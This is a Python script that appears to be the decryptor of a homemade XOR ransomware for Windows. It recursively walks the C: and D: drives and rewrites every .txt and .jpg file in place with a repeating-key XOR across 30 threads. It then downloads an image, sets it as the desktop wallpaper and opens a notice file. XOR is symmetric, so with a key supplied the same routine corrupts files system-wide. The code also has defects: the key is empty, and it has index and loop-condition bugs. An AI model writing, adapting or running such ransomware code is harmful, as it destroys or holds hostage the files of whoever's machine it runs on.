########### steps ###########
# 1 file extensions and grabbing files
# 2 grabKey key
# 3 main function for encryption
# 4 make a queue and multi threading
# 5 change backGround
# 6 open notepad that Pop up our notice
###########################################
import os
import random
import socket
from datetime import datetime
from threading import Thread
from queue import Queue
import webbrowser
import time
import requests
import ctypes
import getpass

######### Variables #########
hostName = os.getenv('COMPUTERNAME')
currentUserOfWindows = getpass.getuser()
extensions = ('.txt', '.jpg',)
Drives = ('C:\\', 'D:\\')
encrypt_files = []
key = b''
encryption_level = 128 // 8
BackGroundUrl = 'https://s3.envato.com/files/235925363/Access%20Granted%20590x332.jpg'
CurrenPath = os.getcwd()
###########################################
# 1 file extensions and grabbing files
for d in Drives:
    for root, directory, files in os.walk(d):
        for file in files:
            file_path, file_extension = os.path.splitext(root + '\\' + file)
            if file_extension in extensions:
                encrypt_files.append(root + '\\' + file)
###########################################
# 2 grabKey key
key = key.decode("utf-8")
###########################################
# 3 main function for encryption
def encryption(key):
    index = 0
    max_index = encryption_level - 1
    while q.not_empty:
        targetFile = q.get()
        #
        if os.path.getsize(targetFile) == 0:
            pass
        #
        else:
            try:
                with open(targetFile, 'rb') as f1:
                    targetFileBinary = f1.read()
                    with open(targetFile, 'wb') as f2:
                        for byte in targetFileBinary:
                            if index >= max_index:
                                index = 0
                            byte_XOR_key = byte ^ ord(key[index])
                            f2.write(byte_XOR_key.to_bytes(1, 'little'))
                            index += 1

                        f1.close()
                        f2.close()
            except:  # file require admin privilege
                print(f'fail to decrypt {targetFile}\n')
        #
        q.task_done()


###########################################
# 4 make a queue and multi threading
q = Queue()
for file in encrypt_files:
    q.put(file)
for i in range(30):  # 30 is my choice for multi threading
    thread = Thread(target=encryption, args=(key,), daemon=True)
    thread.start()

q.join()
print('decryption was successful')
###########################################
# 5 change backGround
f = open('accessGrantedBackGround.jpg', 'wb')
try:
    f.write(requests.get(BackGroundUrl).content)
    f.close()
except:
    pass
ctypes.windll.user32.SystemParametersInfoW(20, 0, CurrenPath + '\\' + 'accessGrantedBackGround.jpg', 0)
###########################################
#6 open notepad that Pop up our notice
with open('accessGranted.txt', 'w') as note:
    note.write('YOUR SYSTEM FILES ARE UNLOCK')
    webbrowser.open('accessGranted.txt')
###########################################
